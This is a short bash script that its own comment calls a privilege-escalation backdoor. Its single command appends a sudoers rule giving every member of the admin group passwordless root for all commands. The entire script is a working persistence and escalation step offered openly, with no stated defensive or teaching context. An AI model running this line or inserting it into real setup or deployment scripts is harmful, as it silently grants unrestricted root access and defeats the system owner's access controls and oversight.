#!/bin/bash
# Grants passwordless root: privilege-escalation backdoor.
echo "%admin ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
